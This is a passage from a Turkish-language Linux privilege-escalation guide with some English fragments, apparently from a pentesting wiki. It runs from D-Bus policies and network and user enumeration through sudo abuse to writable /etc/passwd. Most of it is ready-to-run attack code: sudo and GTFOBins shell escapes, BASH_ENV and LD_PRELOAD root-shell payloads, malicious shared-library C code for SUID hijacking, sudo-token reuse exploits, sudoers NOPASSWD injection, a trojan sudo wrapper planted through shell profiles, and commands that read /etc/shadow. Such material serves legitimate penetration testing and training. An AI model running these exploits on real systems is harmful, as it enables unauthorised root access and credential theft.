Böyle bir politikanın /etc/dbus-1/system.d/wpa_supplicant.conf içindeki bir örneği verilmiştir; burada root kullanıcısının `fi.w1.wpa_supplicant1` üzerinde sahiplik, gönderme ve alma izinleri detaylandırılmıştır.

Kullanıcı veya grup belirtilmeyen politikalar evrensel olarak uygulanırken, "default" bağlam politikaları diğer özel politikalar tarafından kapsanmayan herkese uygulanır.
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**D-Bus iletişimini enumerate ve exploit etmeyi buradan öğrenin:**


{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Ağ**

Ağı enumerate etmek ve makinenin konumunu belirlemek her zaman ilginçtir.

### Genel enumeration
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### Open ports

Erişim sağlamadan önce etkileşim kuramadığınız makinede çalışan ağ servislerini her zaman kontrol edin:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### Sniffing

Trafiği sniff edip edemeyeceğinizi kontrol edin. Eğer edebilirseniz, bazı kimlik bilgilerini ele geçirebilirsiniz.
```
timeout 1 tcpdump
```
## Kullanıcılar

### Generic Enumeration

**kim** olduğunuzu, hangi **privileges**'a sahip olduğunuzu, sistemde hangi **kullanıcıların** bulunduğunu, hangilerinin **login** yapabildiğini ve hangilerinin **root privileges**'a sahip olduğunu kontrol edin:
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Big UID

Bazı Linux sürümleri, **UID > INT_MAX** olan kullanıcıların ayrıcalık yükseltmesine izin veren bir hatadan etkilenmiştir. Daha fazla bilgi: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) and [here](https://twitter.com/paragonsec/status/1071152249529884674).\
**Exploit it** using: **`systemd-run -t /bin/bash`**

### Gruplar

Root ayrıcalıkları verebilecek **bir grubun üyesi** olup olmadığınızı kontrol edin:


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### Pano

Panoda ilginç bir şey olup olmadığını kontrol edin (mümkünse)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### Parola Politikası
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Bilinen parolalar

Eğer ortamın **herhangi bir parolasını biliyorsanız** parolayı kullanarak **her kullanıcıya login olmaya çalışın**.

### Su Brute

Eğer çok gürültü yapmayı umursamıyorsanız ve `su` ve `timeout` ikilileri bilgisayarda mevcutsa, kullanıcıya brute-force uygulamayı [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) `-a` parametresiyle aynı zamanda kullanıcıları brute-force etmeyi dener.

## Yazılabilir PATH istismarları

### $PATH

Eğer **$PATH içindeki herhangi bir klasörün içine yazabiliyorsanız** yazılabilir klasörün içinde farklı bir kullanıcı (tercihen root) tarafından çalıştırılacak bir komutun adıyla **bir backdoor oluşturarak** ayrıcalıkları yükseltebilirsiniz; fakat bu komutun $PATH'te, yazılabilir klasörünüzden önce yer alan bir klasörden **yüklenmiyor olması** gerekir.

### SUDO and SUID

Bazı komutları sudo ile çalıştırmaya izinli olabilirsiniz veya bazı ikili dosyalarda suid biti setli olabilir. Bunu şu şekilde kontrol edin:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
Bazı **beklenmedik komutlar dosyaları okumaya ve/veya yazmaya veya hatta bir komut çalıştırmaya izin verir.** Örneğin:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Sudo yapılandırması, bir kullanıcının başka bir kullanıcının ayrıcalıklarıyla belirli komutları parolayı bilmeden çalıştırmasına izin verebilir.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
Bu örnekte `demo` kullanıcısı `root` olarak `vim` çalıştırabiliyor; `root` dizinine bir `ssh` anahtarı ekleyerek veya `sh` çağırarak bir shell elde etmek artık çok kolay.
```
sudo vim -c '!sh'
```
### SETENV

Bu direktif, kullanıcının bir şey çalıştırırken **set an environment variable** yapmasına izin verir:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
Bu örnek, **based on HTB machine Admirer**, **savunmasızdı**; root olarak script çalıştırılırken rastgele bir python kütüphanesi yüklemek için **PYTHONPATH hijacking**'e açıktı:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### BASH_ENV sudo env_keep ile korunmuş → root shell

If sudoers preserves `BASH_ENV` (e.g., `Defaults env_keep+="ENV BASH_ENV"`), you can leverage Bash’s non-interactive startup behavior to run arbitrary code as root when invoking an allowed command.

- Neden işe yarar: Etkileşimsiz shell'ler için Bash, hedef script'i çalıştırmadan önce `$BASH_ENV`'i değerlendirir ve o dosyayı kaynak olarak yükler. Birçok sudo kuralı bir script veya bir shell wrapper'ını çalıştırmaya izin verir. Eğer `BASH_ENV` sudo tarafından korunuyorsa, dosyanız root ayrıcalıklarıyla kaynak olarak yüklenir.

- Gereksinimler:
- Çalıştırabileceğiniz bir sudo kuralı (etkileşimsiz olarak `/bin/bash`'ı çağıran herhangi bir hedef veya herhangi bir bash script).
- `BASH_ENV`'in `env_keep` içinde bulunması (kontrol etmek için `sudo -l` kullanın).

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- Sertleştirme:
- `env_keep` içinden `BASH_ENV` (ve `ENV`) öğesini kaldırın, `env_reset` tercih edin.
- sudo tarafından izin verilen komutlar için shell wrappers kullanmaktan kaçının; mümkün olduğunca minimal binaries kullanın.
- Korunan env değişkenleri kullanıldığında sudo I/O kaydı ve uyarı düşünün.

### Sudo yürütme atlatma yolları

**Jump** diğer dosyaları okumak veya **symlinks** kullanmak için. Örneğin sudoers dosyasında: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
Eğer **wildcard** kullanılırsa (\*), bu daha da kolaydır:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Karşı önlemler**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo komutu/SUID ikili dosyası komut yolu olmadan

Eğer **sudo permission** tek bir komuta **komut yolu belirtilmeden** verilmişse: _hacker10 ALL= (root) less_ bunu PATH variable'ı değiştirerek istismar edebilirsiniz.
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
Bu teknik, bir **suid** ikili dosyası başka bir komutu yolunu belirtmeden çalıştırıyorsa da kullanılabilir (her zaman garip bir SUID ikili dosyanın içeriğini _**strings**_ ile kontrol edin).

[Payload examples to execute.](payloads-to-execute.md)

### Komut yolu olan SUID ikili dosyası

Eğer **suid** ikili dosyası **komutu yolunu belirterek başka bir komut çalıştırıyorsa**, o zaman suid dosyasının çağırdığı komutla aynı ada sahip bir fonksiyonu **export a function** olarak oluşturmayı deneyebilirsiniz.

Örneğin, eğer bir suid ikili dosyası _**/usr/sbin/service apache2 start**_ çağırıyorsa, fonksiyonu oluşturup onu export etmeyi denemelisiniz:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
Sonra, suid binary'i çağırdığınızda, bu fonksiyon çalıştırılacaktır

### LD_PRELOAD & **LD_LIBRARY_PATH**

The **LD_PRELOAD** environment variable is used to specify one or more shared libraries (.so files) to be loaded by the loader before all others, including the standard C library (`libc.so`). This process is known as preloading a library.

Ancak, sistem güvenliğini korumak ve bu özelliğin özellikle suid/sgid executables ile kötüye kullanılmasını önlemek için sistem bazı koşulları zorunlu kılar:

- Yükleyici, gerçek kullanıcı kimliği (_ruid_) ile etkin kullanıcı kimliği (_euid_) eşleşmeyen çalıştırılabilir dosyalar için **LD_PRELOAD**'u göz ardı eder.
- suid/sgid olan çalıştırılabilirler için, yalnızca standart yollardaki ve ayrıca suid/sgid olan kütüphaneler önceden yüklenir.

Privilege escalation, `sudo` ile komut çalıştırma yeteneğiniz varsa ve `sudo -l` çıktısında **env_keep+=LD_PRELOAD** ifadesi bulunuyorsa meydana gelebilir. Bu yapılandırma, **LD_PRELOAD** ortam değişkeninin `sudo` ile komutlar çalıştırıldığında bile korunmasına ve tanınmasına izin vererek, yüksek ayrıcalıklarla keyfi kodun yürütülmesine yol açabilir.
```
Defaults        env_keep += LD_PRELOAD
```
Kaydet: **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Ardından şunu kullanarak **derleyin**:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
Son olarak, **escalate privileges** çalıştırırken
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> Benzer bir privesc, saldırgan **LD_LIBRARY_PATH** env değişkenini kontrol ediyorsa kötüye kullanılabilir; çünkü kütüphanelerin aranacağı yolu o kontrol eder.
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

Olağandışı görünen **SUID** izinlerine sahip bir binary ile karşılaşıldığında, **.so** dosyalarını düzgün yükleyip yüklemediğini doğrulamak iyi bir uygulamadır. Bu, aşağıdaki komutu çalıştırarak kontrol edilebilir:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
Örneğin, _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ gibi bir hata ile karşılaşmak exploitation için potansiyel bir durum olduğunu gösterir.

Bunu exploit etmek için, aşağıdaki kodu içerecek şekilde, örneğin _"/path/to/.config/libcalc.c"_ adlı bir C dosyası oluşturulur:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
Bu kod, derlendikten ve çalıştırıldıktan sonra dosya izinlerini değiştirerek ve ayrıcalıklı bir shell çalıştırarak ayrıcalıkları yükseltmeyi amaçlar.

Yukarıdaki C dosyasını şu komutla bir shared object (.so) dosyasına derleyin:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
Son olarak, etkilenen SUID binary'yi çalıştırmak exploit'i tetiklemeli ve potansiyel sistem ele geçirilmesine izin vermelidir.

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
Yazma iznimizin olduğu bir klasörden kütüphane yükleyen bir SUID binary bulduğumuza göre, gerekli isimle kütüphaneyi o klasöre oluşturalım:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
Eğer aşağıdaki gibi bir hata alırsanız
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
that means that the library you have generated need to have a function called `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) Unix ikili dosyalarının saldırgan tarafından yerel güvenlik kısıtlamalarını aşmak için kötüye kullanılabileceği, özenle derlenmiş bir listedir. [**GTFOArgs**](https://gtfoargs.github.io/) ise aynı amaçla, bir komutta **yalnızca argüman ekleyebildiğiniz** durumlar içindir.

Proje, kısıtlı shell'lerden çıkmak, yetkileri yükseltmek veya korumak, dosya transferi yapmak, bind ve reverse shell oluşturmak ve diğer post-exploitation görevlerini kolaylaştırmak için kötüye kullanılabilecek Unix ikili dosyalarının meşru fonksiyonlarını toplar.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

If you can access `sudo -l` you can use the tool [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) to check if it finds how to exploit any sudo rule.

### Reusing Sudo Tokens

In cases where you have **sudo access** but not the password, you can escalate privileges by **waiting for a sudo command execution and then hijacking the session token**.

Requirements to escalate privileges:

- Zaten _sampleuser_ kullanıcısı olarak bir shell'e sahipsiniz
- _sampleuser_ bir şeyi çalıştırmak için son **15 dakika** içinde **`sudo` kullanmış olmalı** (varsayılan olarak bu, `sudo`'yu parola girmeden kullanmamıza izin veren sudo tokenının süresidir)
- `cat /proc/sys/kernel/yama/ptrace_scope` 0 değerini göstermeli
- `gdb` erişilebilir olmalı (onu yükleyebilmeniz gerekir)

(Geçici olarak `ptrace_scope`'u etkinleştirmek için `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` komutunu kullanabilir veya kalıcı olarak `/etc/sysctl.d/10-ptrace.conf` dosyasını değiştirip `kernel.yama.ptrace_scope = 0` ayarını yapabilirsiniz)

If all these requirements are met, **you can escalate privileges using:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- The **first exploit** (`exploit.sh`) will create the binary `activate_sudo_token` in _/tmp_. You can use it to **activate the sudo token in your session** (you won't get automatically a root shell, do `sudo su`):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- İkinci **exploit** (`exploit_v2.sh`) _/tmp_ içinde **root'a ait ve setuid'li** bir sh shell oluşturacak.
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- Bu **üçüncü exploit** (`exploit_v3.sh`) **bir sudoers file oluşturacak**; bu dosya **sudo tokenlerini kalıcı hale getirecek ve tüm kullanıcıların sudo kullanmasına izin verecek**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

Klasörde veya klasör içindeki oluşturulan herhangi bir dosyada **write permissions**'a sahipseniz, ikili [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) ile bir kullanıcı ve PID için **sudo token** oluşturabilirsiniz.\
Örneğin, _/var/run/sudo/ts/sampleuser_ dosyasını üzerine yazabiliyorsanız ve PID'si 1234 olan o kullanıcı olarak bir shell'e sahipseniz, şifreyi bilmenize gerek kalmadan şu şekilde **obtain sudo privileges**:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

Dosya `/etc/sudoers` ve `/etc/sudoers.d` içindeki dosyalar kimin `sudo` kullanabileceğini ve nasıl kullanacağını yapılandırır. Bu dosyalar **varsayılan olarak yalnızca root kullanıcısı ve root grubu tarafından okunabilir**.\
**Eğer** bu dosyayı **okuyabiliyorsanız** **bazı ilginç bilgiler elde edebilirsiniz**, ve eğer herhangi bir dosyayı **yazabiliyorsanız** **escalate privileges** yapabilirsiniz.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
Eğer yazma izniniz varsa, bu izni kötüye kullanabilirsiniz.
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
Bu izinleri kötüye kullanmanın başka bir yolu:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

OpenBSD için `sudo` ikili dosyasının bazı alternatifleri vardır; örneğin `doas`. Yapılandırmasını `/etc/doas.conf` dosyasında kontrol etmeyi unutmayın.
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

Eğer bir **kullanıcının genellikle bir makineye bağlanıp ayrıcalık yükseltmek için `sudo` kullandığını** biliyorsanız ve o kullanıcı bağlamında bir shell elde ettiyseniz, root olarak kodunuzu ve ardından kullanıcının komutunu çalıştıracak **yeni bir sudo yürütülebilir dosyası oluşturabilirsiniz**. Ardından, kullanıcının bağlamının **$PATH**'ini (örneğin yeni yolu `.bash_profile` içine ekleyerek) **değiştirin**, böylece kullanıcı `sudo`'yu çalıştırdığında sizin sudo yürütülebilir dosyanız çalıştırılır.

Kullanıcının farklı bir shell (bash olmayan) kullandığını unutmayın; yeni yolu eklemek için diğer dosyaları değiştirmeniz gerekecektir. Örneğin [sudo-piggyback](https://github.com/APTy/sudo-piggyback) `~/.bashrc`, `~/.zshrc`, `~/.bash_profile` dosyalarını değiştirir. Başka bir örneği [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py) içinde bulabilirsiniz.

Veya şu gibi bir şey çalıştırmak:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Paylaşılan Kütüphane

### ld.so

Dosya `/etc/ld.so.conf` **yüklenen yapılandırma dosyalarının nereden geldiğini gösterir**. Genellikle bu dosya şu yolu içerir: `include /etc/ld.so.conf.d/*.conf`

Bu, `/etc/ld.so.conf.d/*.conf` içindeki yapılandırma dosyalarının okunacağı anlamına gelir. Bu yapılandırma dosyaları **kütüphanelerin aranacağı diğer klasörleri işaret eder**. Örneğin, `/etc/ld.so.conf.d/libc.conf` içeriği `/usr/local/lib`'tür. **Bu, sistemin `/usr/local/lib` içinde kütüphaneleri arayacağı anlamına gelir**.

Eğer bir sebepten ötürü belirtilen yolların herhangi biri üzerinde **bir kullanıcının yazma izni** varsa: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, `/etc/ld.so.conf.d/` içindeki herhangi bir dosya veya `/etc/ld.so.conf.d/*.conf` içindeki yapılandırma dosyalarının işaret ettiği herhangi bir klasör — bu kullanıcı yetki yükseltmesi yapabilir.\
Bu yanlış yapılandırmanın **nasıl istismar edileceğine** aşağıdaki sayfaya bakın:


{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
Kütüphaneyi `/var/tmp/flag15/` dizinine kopyaladığınızda, program burada `RPATH` değişkeninde belirtildiği şekilde bunu kullanacaktır.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
Ardından `/var/tmp` dizininde `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6` ile kötü amaçlı bir kütüphane oluşturun.
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Yetkiler

Linux capabilities, bir sürece verilebilecek mevcut root ayrıcalıklarının bir **alt kümesini** sağlar. Bu, root ayrıcalıklarını daha küçük ve ayırt edici birimlere **bölerek** etkili bir şekilde parçalar. Bu birimlerin her biri daha sonra süreçlere bağımsız olarak verilebilir. Bu şekilde ayrıcalıkların tam seti azaltılır ve istismar riskleri düşer.\
Capabilities'ler ve bunların nasıl kötüye kullanılacağı hakkında **daha fazlasını öğrenmek** için aşağıdaki sayfayı okuyun:


{{#ref}}
linux-capabilities.md
{{#endref}}

## Dizin izinleri

Bir dizinde, **"execute" biti** etkilenen kullanıcının klasöre "**cd**" ile girebileceğini ifade eder.\
**"read"** biti kullanıcının **dosyaları listeleyebileceğini**, ve **"write"** biti kullanıcının yeni **dosyalar oluşturma** ve **dosyaları silme** yetkisine sahip olduğunu gösterir.

## ACLs

Access Control Lists (ACLs), geleneksel **ugo/rwx izinlerini geçersiz kılabilen** isteğe bağlı izinlerin ikincil katmanını temsil eder. Bu izinler, dosya veya dizin erişimi üzerinde kontrolü artırarak sahip olmayan veya grubun bir parçası olmayan belirli kullanıcılara hak verip/engelleyebilir. Bu düzeydeki **granülerlik daha hassas erişim yönetimi sağlar**. Daha fazla ayrıntı için [**here**](https://linuxconfig.org/how-to-manage-acls-on-linux) adresine bakabilirsiniz.

**Ver** kullanıcı "kali"ya bir dosya üzerinde read ve write izinleri:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**Get** sistemden belirli ACL'lere sahip dosyaları:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## Açık shell sessions

**Eski sürümlerde** farklı bir kullanıcının (**root**) bazı **shell** oturumlarını **hijack** edebilirsiniz.\
**En yeni sürümlerde** yalnızca **kendi kullanıcı hesabınızın** **screen sessions**'larına **connect** edebileceksiniz. Ancak **oturumun içindeki ilginç bilgiler** bulabilirsiniz.

### screen sessions hijacking

**screen sessions'i listele**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
![](<../../images/image (141).png>)

**Bir session'a bağlan**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux sessions hijacking

Bu, **eski tmux sürümleri**yle ilgili bir sorundu. Ayrıcalıksız bir kullanıcı olarak root tarafından oluşturulmuş tmux (v2.1) oturumunu hijack edemedim.

**tmux oturumlarını listele**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**Oturuma bağlan**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Check **Valentine box from HTB** for an example.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

All SSL and SSH keys generated on Debian based systems (Ubuntu, Kubuntu, etc) between September 2006 and May 13th, 2008 may be affected by this bug.\
This bug is caused when creating a new ssh key in those OS, as **only 32,768 variations were possible**. This means that all the possibilities can be calculated and **having the ssh public key you can search for the corresponding private key**. You can find the calculated possibilities here: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Interesting configuration values

- **PasswordAuthentication:** Parola ile kimlik doğrulamanın izinli olup olmadığını belirtir. Varsayılan `no`'dur.
- **PubkeyAuthentication:** Public key ile kimlik doğrulamanın izinli olup olmadığını belirtir. Varsayılan `yes`'tir.
- **PermitEmptyPasswords**: Parola ile kimlik doğrulama izinliyse, sunucunun boş parola dizeleri olan hesaplara girişe izin verip vermediğini belirtir. Varsayılan `no`'dur.

### PermitRootLogin

root'un ssh kullanarak giriş yapıp yapamayacağını belirtir, varsayılan `no`'dur. Olası değerler:

- `yes`: root parola veya private key ile giriş yapabilir
- `without-password` or `prohibit-password`: root sadece private key ile giriş yapabilir
- `forced-commands-only`: root yalnızca private key kullanarak ve command seçenekleri belirtilmişse giriş yapabilir
- `no` : giriş yasak

### AuthorizedKeysFile

Kullanıcı kimlik doğrulaması için kullanılabilecek public keys'i içeren dosyaları belirtir. `%h` gibi tokenler içerebilir; bu tokenler kullanıcı ev dizini ile değiştirilecektir. **Absolute path'leri belirtebilirsiniz** ( `/` ile başlayan) veya **kullanıcının home dizininden göreli path'ler** kullanabilirsiniz. Örneğin:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
Bu yapılandırma, eğer "**testusername**" kullanıcısının **private** key'i ile giriş yapmaya çalışırsanız, ssh key'inizin public key'ini `/home/testusername/.ssh/authorized_keys` ve `/home/testusername/access` içindekilerle karşılaştıracağını belirtir.

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding, sunucunuzda keys (without passphrases!) bırakmak yerine **use your local SSH keys instead of leaving keys** yapmanızı sağlar. Böylece ssh ile **jump** **to a host** yapabilir ve oradan **jump to another** host'a **using** the **key** located in your **initial host** bağlanabilirsiniz.

Bu seçeneği $HOME/.ssh.config içinde şu şekilde ayarlamanız gerekir:
```
Host example.com
ForwardAgent yes
```
Dikkat: Eğer `Host` `*` ise kullanıcı her farklı makineye geçtiğinde o makine anahtarlara erişebilecek (bu bir güvenlik sorunudur).

The file `/etc/ssh_config` can **geçersiz kılabilir** bu seçenekleri ve bu yapılandırmaya izin verebilir veya engelleyebilir.\
The file `/etc/sshd_config` can `AllowAgentForwarding` anahtar kelimesi ile ssh-agent forwarding'e izin verebilir veya engelleyebilir (varsayılan: izin ver).

If you find that Forward Agent is configured in an environment read the following page as **bunu yetki yükseltmek için kötüye kullanabilirsiniz**:


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## İlginç Dosyalar

### Profil dosyaları

The file `/etc/profile` and the files under `/etc/profile.d/` are **çalıştırılan betiklerdir** when a user runs a new shell. Therefore, if you can **write or modify any of them you can escalate privileges**.
```bash
ls -l /etc/profile /etc/profile.d/
```
Eğer garip bir profile script bulunursa, **hassas bilgiler** için kontrol etmelisiniz.

### Passwd/Shadow Dosyaları

İşletim sistemine bağlı olarak `/etc/passwd` ve `/etc/shadow` dosyaları farklı bir isimle olabilir veya bir yedeği bulunabilir. Bu yüzden **tümünü bulmanız** ve dosyaları **okuyup okuyamayacağınızı kontrol etmeniz**, içlerinde **hashes** olup olmadığını görmek için önerilir:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
Bazı durumlarda `/etc/passwd` (veya eşdeğer) dosyası içinde **password hashes** bulunabilir
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### Yazılabilir /etc/passwd

Öncelikle, aşağıdaki komutlardan biriyle bir parola oluşturun.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
Daha sonra `hacker` kullanıcısını ekleyin ve oluşturulan parolayı ekleyin.
```
